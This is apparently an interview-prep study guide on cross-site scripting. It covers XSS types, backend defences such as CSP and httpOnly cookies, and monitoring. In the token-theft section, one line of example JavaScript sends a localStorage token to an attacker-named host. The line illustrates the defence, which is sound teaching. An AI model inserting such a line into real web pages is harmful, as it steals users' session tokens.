# What is XSS

## Detailed explanation

What is XSS is a core backend security topic that interviewers use to check whether you can connect definitions to production backend behavior. A strong answer should explain the mental model, the backend problem it solves, the implementation shape, operational trade-offs, and common failure modes.

## 1. One-line mental model

Understand what is xss by linking what it is, why it exists, and how it fails in production.

## 2. Problem it solves

It prevents shallow interview answers and production mistakes by forcing you to reason about correctness, security, performance, maintainability, and frontend/backend contract behavior.

## 3. Core idea

- Define the concept in backend terms.
- Explain the problem it solves.
- Show where it appears in real services.
- Call out security, performance, or reliability impact.
- Compare it with nearby concepts.

## 4. Visual / analogy

```txt
Request/API/service -> concept applied -> safer production behavior
```

## 5. Minimal example

```txt
Input  -> validate
Work   -> apply backend security rule
Output -> success or structured error
```

## 6. Real-world example

In a production full-stack app, what is xss affects route design, database access, user-visible behavior, error handling, monitoring, and safe deployment.

## 7. Common interview questions

#### What is XSS (Cross-Site Scripting)?
- **The Engine Mechanism (Why it behaves this way):** XSS is a vulnerability where an attacker injects malicious JavaScript into a web page that other users view. The injected script executes in the victim's browser context, gaining access to cookies, localStorage, DOM, and the ability to make requests on behalf of the user. XSS occurs when user-supplied data is rendered as executable code without proper sanitization or encoding.
- **The Unforgettable Mental Model:** The **Poisoned Bulletin Board**. Someone pins a notice (user input) on the community board (web page). But the notice contains a hidden instruction (malicious script) that tells anyone who reads it to hand over their house keys (cookies/tokens). The board doesn't check what's on the notice before displaying it.
- **The Trap:** Thinking XSS is only a frontend problem. The backend is responsible for sanitizing data before storing it and for setting proper security headers (CSP) that mitigate XSS impact.
- **Senior Interview Playbook (Verbal Script):** "When asked this in an interview, say: XSS is a vulnerability where malicious JavaScript is injected into a web page and executed in other users' browsers. The script runs in the victim's context, gaining access to cookies, localStorage, and the ability to make authenticated requests. XSS occurs when user input is rendered without proper sanitization or encoding. While the frontend handles output encoding, the backend plays a critical role by sanitizing input before storage and setting security headers like CSP to mitigate impact."

#### What are the types of XSS?
- **The Engine Mechanism (Why it behaves this way):** Three types: (1) Reflected XSS — malicious script comes from the current HTTP request (URL parameter, form submission), reflected in the response immediately, (2) Stored XSS — malicious script is stored on the server (database, comment, profile) and served to all users who view the affected page, (3) DOM-based XSS — the vulnerability is entirely in client-side JavaScript, where user input is processed and rendered as executable code without server involvement.
- **The Unforgettable Mental Model:** **Mirror vs. Graffiti vs. Self-Inflicted**. Reflected is like a mirror that shows back what you shout at it (immediate reflection). Stored is like graffiti on a wall — everyone who walks by sees it. DOM-based is like talking to yourself in a way that changes your own behavior — no server involved.
- **The Trap:** Only protecting against stored XSS while ignoring reflected XSS. Both are dangerous — reflected XSS can be delivered via phishing links, and stored XSS affects all users who view the compromised content.
- **Senior Interview Playbook (Verbal Script):** "When asked this in an interview, say: There are three types of XSS. Reflected XSS comes from the current request — a malicious URL parameter is reflected in the response. Stored XSS is saved on the server and served to all users who view the affected page — this is the most dangerous. DOM-based XSS is entirely client-side, where JavaScript processes user input unsafely. I protect against all three: input sanitization on the backend, output encoding on the frontend, and CSP headers as defense-in-depth."

#### How does XSS steal tokens?
- **The Engine Mechanism (Why it behaves this way):** An injected XSS script can read tokens from localStorage (`localStorage.getItem('token')`), read cookies (`document.cookie`), and send them to the attacker's server via `fetch()` or `Image` beacon. The attacker then uses the stolen token to impersonate the victim. This is why httpOnly cookies are critical — they're inaccessible to JavaScript, so XSS can't steal them.
- **The Unforgettable Mental Model:** The **Pickpocket Script**. The injected script is like a pickpocket that walks through the page, checking everyone's pockets (localStorage, cookies) and mailing the contents (tokens) to the thief's address (attacker's server).
- **The Trap:** Storing tokens in localStorage. Any XSS vulnerability becomes a token theft vector. httpOnly cookies are the defense — they're invisible to JavaScript.
- **Senior Interview Playbook (Verbal Script):** "When asked this in an interview, say: XSS steals tokens by reading them from localStorage or document.cookie and sending them to the attacker's server. A single line of JavaScript — `fetch('https://attacker.com', {body: localStorage.getItem('token')})` — exfiltrates the token. This is why I store tokens in httpOnly cookies, which are inaccessible to JavaScript. Even if XSS succeeds, the token can't be stolen. This is the most important defense against XSS-based token theft."

#### How does the backend contribute to XSS prevention?
- **The Engine Mechanism (Why it behaves this way):** Backend XSS prevention: (1) Input sanitization — strip or encode dangerous characters before storing user input, (2) Content-Type headers — serve content with correct MIME types to prevent MIME sniffing attacks, (3) CSP headers — restrict script sources to prevent inline and external script execution, (4) httpOnly cookies — protect tokens from XSS, (5) Output encoding context — ensure the frontend knows the context (HTML, attribute, URL, JavaScript) for proper encoding.
- **The Unforgettable Mental Model:** The **Water Treatment Plant**. The backend treats the water (user input) before it reaches the city (frontend): filtering out contaminants (sanitization), labeling the water type (Content-Type), setting water quality standards (CSP), and protecting the main supply (httpOnly cookies).
- **The Trap:** Relying solely on frontend encoding. If the backend stores unsanitized input, any frontend that renders it without encoding becomes vulnerable. Defense-in-depth requires both backend sanitization and frontend encoding.
- **Senior Interview Playbook (Verbal Script):** "When asked this in an interview, say: The backend prevents XSS through input sanitization before storage, correct Content-Type headers, CSP headers that restrict script sources, httpOnly cookies that protect tokens, and ensuring the frontend knows the encoding context for user data. I don't rely solely on frontend encoding — the backend sanitizes input as the first line of defense. CSP headers are critical defense-in-depth — even if XSS is injected, CSP prevents it from executing."

#### How does CSP mitigate XSS?
- **The Engine Mechanism (Why it behaves this way):** Content Security Policy (CSP) is an HTTP header that restricts where scripts can load from and whether inline scripts can execute. A strict CSP like `script-src 'self'` blocks all scripts except those from the same origin. This prevents injected inline scripts and scripts from external domains from executing, even if XSS is successfully injected.
- **The Unforgettable Mental Model:** The **Bouncer's Guest List**. CSP is like a bouncer who only lets in guests from the approved list (allowed script sources). Even if someone sneaks a fake invitation (injected script) into the venue, the bouncer checks the list and turns them away.
- **The Trap:** Using a weak CSP that allows `unsafe-inline` or `unsafe-eval`. These directives essentially disable CSP's XSS protection. A strict CSP should never include these.
- **Senior Interview Playbook (Verbal Script):** "When asked this in an interview, say: CSP mitigates XSS by restricting where scripts can load from and blocking inline script execution. A strict `script-src 'self'` policy allows only scripts from the same origin, blocking injected inline scripts and external malicious scripts. I never use `unsafe-inline` or `unsafe-eval` — they defeat CSP's purpose. CSP is defense-in-depth — it doesn't prevent XSS injection, but it prevents the injected script from executing."

#### What would you monitor for XSS?
- **The Engine Mechanism (Why it behaves this way):** Monitor: CSP violation reports (indicates attempted XSS or misconfiguration), stored XSS detection (scanning user content for script tags), reflected XSS attempts (unusual URL parameters with script patterns), and token exfiltration detection (unusual outbound requests to unknown domains). Alert on CSP violations and detected XSS patterns.
- **The Unforgettable Mental Model:** The **XSS Radar**. You're watching for incoming threats (CSP violations), hidden threats in stored content (script tag detection), and outgoing data theft (token exfiltration patterns).
- **The Trap:** Not monitoring CSP violation reports. CSP violations are the earliest indicator of XSS attempts — either from attackers or from legitimate scripts blocked by misconfigured policies.
- **Senior Interview Playbook (Verbal Script):** "When asked this in an interview, say: I monitor XSS through CSP violation reports (earliest indicator of XSS attempts), stored content scanning for script patterns, reflected XSS detection in URL parameters, and token exfiltration detection through unusual outbound requests. CSP violations are the most valuable signal — they indicate either an attack or a misconfigured policy. I also monitor for script injection patterns in user-generated content and alert on any detected XSS payloads."

## 8. Active recall test

1. **What is XSS?**
   - **Explanation:** Cross-Site Scripting — a vulnerability where malicious JavaScript is injected into a web page and executed in other users' browsers, gaining access to their cookies, tokens, and authenticated session.
2. **What are the three types of XSS?**
   - **Explanation:** Reflected (from current request, immediate), Stored (saved on server, served to all users), DOM-based (client-side only, no server involvement).
3. **How does XSS steal tokens?**
   - **Explanation:** Injected script reads tokens from localStorage or document.cookie and sends them to the attacker's server. Prevented by storing tokens in httpOnly cookies.
4. **How does the backend prevent XSS?**
   - **Explanation:** Input sanitization before storage, correct Content-Type headers, CSP headers, httpOnly cookies, and ensuring proper output encoding context for the frontend.
5. **How does CSP mitigate XSS?**
   - **Explanation:** CSP restricts script sources and blocks inline scripts. A strict `script-src 'self'` prevents injected scripts from executing, even if they're successfully injected.
6. **Why are httpOnly cookies the best defense against XSS token theft?**
   - **Explanation:** httpOnly cookies are inaccessible to JavaScript. Even if XSS executes, it cannot read httpOnly cookies, so tokens stored in them can't be stolen.
7. **What should you monitor for XSS?**
   - **Explanation:** CSP violation reports, stored content for script patterns, reflected XSS in URL parameters, and token exfiltration via unusual outbound requests.

## 9. Mistakes / traps

- Giving only a definition without implementation details.
- Ignoring auth, validation, data consistency, or failure handling.
- Forgetting frontend contract impact.
- Designing only the happy path.
- Missing observability and rollback concerns.

## 10. Compare with related concepts

Compare this with nearby topics by asking whether the concern is API contract, database correctness, runtime behavior, security, scaling, deployment, or debugging.

## 11. Summary from memory

Explain What is XSS in your own words, then give one backend example, one frontend impact, and one production failure it prevents.

## 12. Spaced revision prompts

- Day 1: Define What is XSS in one sentence.
- Day 3: Write or sketch a minimal example.
- Day 7: Explain edge cases and failure modes.
- Day 14: Compare with a related full-stack topic.
